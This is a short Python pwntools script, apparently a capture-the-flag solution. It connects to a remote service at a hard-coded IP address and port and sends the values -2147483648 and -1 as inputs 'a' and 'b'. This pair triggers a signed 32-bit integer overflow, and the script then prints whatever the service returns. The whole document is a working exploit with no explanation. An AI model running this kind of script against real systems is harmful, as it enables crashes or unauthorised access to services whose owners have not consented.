from pwn import *

r = remote('136.115.87.65', 31777)
r.recvuntil(b"a = ")
r.sendline(b"-2147483648")
r.recvuntil(b"b = ")
r.sendline(b"-1")
print(r.recvall(timeout=2).decode(errors='ignore'))
